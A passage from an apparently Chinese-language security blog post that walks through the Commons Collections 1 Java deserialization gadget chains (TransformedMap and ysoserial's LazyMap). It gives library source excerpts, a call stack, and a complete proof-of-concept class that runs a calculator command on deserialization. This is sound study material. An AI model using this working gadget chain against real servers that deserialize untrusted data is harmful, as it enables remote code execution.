<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="constanttransformer">ConstantTransformer</h4>
<p><strong>ConstantTransformer</strong> 类调用
<strong>transform</strong> 方法会返回构造时传入的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="invokertransformer">InvokerTransformer</h4>
<p><strong>InvokerTransformer</strong> 类的 <strong>transform</strong>
方法会反射传入的参数，构造方法的三个参数分别是方法名、参数类型、参数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="chainedtransformer">ChainedTransformer</h4>
<p><strong>ChainedTransformer</strong> 类构造方法的传入参数是
<strong>Transformer</strong> 类数组，<strong>transform</strong>
方法会遍历传入的 <strong>Transformer</strong> 数组，调用其
<strong>transform</strong>
方法，并将上一条的输出结果作为下一条的输入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="分析">分析</h3>
<p>那么从 <strong>AnnotationInvocationHandler</strong> 的
<strong>readObject</strong> 方法开始重新捋一遍。</p>
<p><strong>var3</strong> 赋值拿到注解元素名，<strong>var4</strong>
赋值拿到 <strong>POC</strong> 中的 <strong>outerMap</strong>
变量，然后开始遍历。</p>
<p>拿到 <strong>POC</strong> 中 <strong>map</strong> 的
<strong>key</strong> 赋值给 <strong>var6</strong>，然后判断这个
<strong>key</strong> 是否与 <strong>var3</strong>
的注解元素名相等，若不相等，则 <strong>var7</strong> 为
<strong>null</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此 <strong>POC</strong> 这里
<strong>constructor.newInstance</strong> 可选的不只是
<strong>Target.class</strong>，还有 <strong>Repeatable.class</strong> 和
<strong>Retention.class</strong>，但 <strong>map</strong> 的
<strong>key</strong> 皆是 <strong>value</strong>。</p>
<p>然后跟进 <strong>AbstractInputCheckedMapDecorator</strong> 类下的
<strong>setValue</strong> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跳到 <strong>TransformedMap</strong> 类下的
<strong>checkSetValue</strong> 方法，开始调用 <strong>transform</strong>
方法。</p>
<p>而此处的 <strong>valueTransformer</strong> 变量，即为
<strong>POC</strong> 中的 <strong>ChainedTransformer</strong> 对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着在 <strong>chainedTransformer</strong> 中遍历每一个
<strong>Transformer</strong> 类的 <strong>transform</strong> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么接下来就一目了然了，<strong>ConstantTransformer</strong> 传入
<strong>Runtime.class</strong> 并返回，作为接下来
<strong>InvokerTransformer</strong> 类 <strong>transform</strong>
方法的输入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>因此第二个 <strong>InvokerTransformer</strong> 的执行如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Runtime.class.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;);</span><br><span class="line"><span class="keyword">return</span> method.invoke(Runtime.class, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>可以看做如下反射语句。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>而后不必多说，直接一气呵成到命令执行弹计算器，执行如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz), <span class="string">&quot;open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="lazymap利用链">LazyMap利用链</h2>
<p>来自 <strong>ysoserial</strong>。</p>
<h3 id="poc-1">POC</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Documented.class, map);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, map_handler);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandler_Constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC1&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC1&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="调用栈-1">调用栈</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">125</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:<span class="number">77</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-<span class="number">1</span>, $Proxy0 (com.sun.proxy)</span><br><span class="line">readObject:<span class="number">444</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">39</span>, CC1</span><br></pre></td></tr></table></figure>
<h3 id="前置知识-1">前置知识</h3>
<h4 id="动态代理">动态代理</h4>
<p>先定义了接口，但并不去编写实现类，而是直接通过<strong>JDK</strong>提供的一个<strong>Proxy.newProxyInstance()</strong>创建一个接口对象。</p>
<p>这种没有实现类但是在运行期动态创建了一个接口对象的方式，称为动态代码。<strong>JDK</strong>提供的动态创建接口对象的方式，就叫动态代理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(method);</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;morning&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Good morning, &quot;</span> + args[<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) Proxy.newProxyInstance(</span><br><span class="line">            Hello.class.getClassLoader(), <span class="comment">// 传入ClassLoader</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Hello.class &#125;, <span class="comment">// 传入要实现的接口</span></span><br><span class="line">            handler); <span class="comment">// 传入处理调用方法的InvocationHandler</span></span><br><span class="line">        hello.morning(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="lazymap">LazyMap</h4>
<p><strong>LazyMap</strong>类的<strong>get</strong>方法在获取<strong>key</strong>时，若<strong>key</strong>不存在<strong>map</strong>中，会调用一次<strong>transform</strong>方法，然后将其放入<strong>map</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="分析-1">分析</h3>
<p>前半部分反序列化链的构造基本相同，故不赘述，后半部分使用了<strong>LazyMap</strong>来代替<strong>TransformedMap</strong>。</p>
<p>而上面提到，<strong>LazyMap</strong>在<strong>get</strong>方法中调用了<strong>factory</strong>的<strong>transform</strong>方法，故此在<strong>POC</strong>中有如下类似于<strong>TransformedMap</strong>的构造。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br></pre></td></tr></table></figure>
<p><strong>LazyMap</strong>的<strong>decorate</strong>方法将传入的<strong>POC</strong>链赋值给了<strong>factory</strong>变量。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来，在<strong>AnnotationInvocationHandler</strong>类中<strong>invoke</strong>方法中有对<strong>memberValues</strong>变量执行了<strong>get</strong>方法。</p>
<p>而在构造<strong>AnnotationInvocationHandler</strong>类时，传入的<strong>LazyMap</strong>也恰好赋值给了<strong>memberValues</strong>变量。</p>
<p>因此现在需要利用动态代理来调用<strong>AnnotationInvocationHandler</strong>类，从而触发<strong>invoke</strong>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">switch</span> (var4) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从而有<strong>POC</strong>中的如下构造。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Documented.class, map);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, map_handler);</span><br></pre></td></tr></table></figure>
<p>但是到这里还不够，因为需要<strong>proxy_map</strong>对象执行任意方法才能触发<strong>invoke</strong>方法，故需要再将其包装一层，赋值给某个在反序列化过程中执行了任意方法的变量。</p>
<p>那么在<strong>AnnotationInvocationHandler</strong>类的<strong>readObject</strong>方法中，<strong>memberValues</strong>对象执行了一次<strong>entrySet</strong>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此可以继续构造一个<strong>AnnotationInvocationHandler</strong>，将<strong>proxy_map</strong>赋予<strong>memberValues</strong>来触发<strong>map_handler</strong>中包装的<strong>invoke</strong>方法。</p>
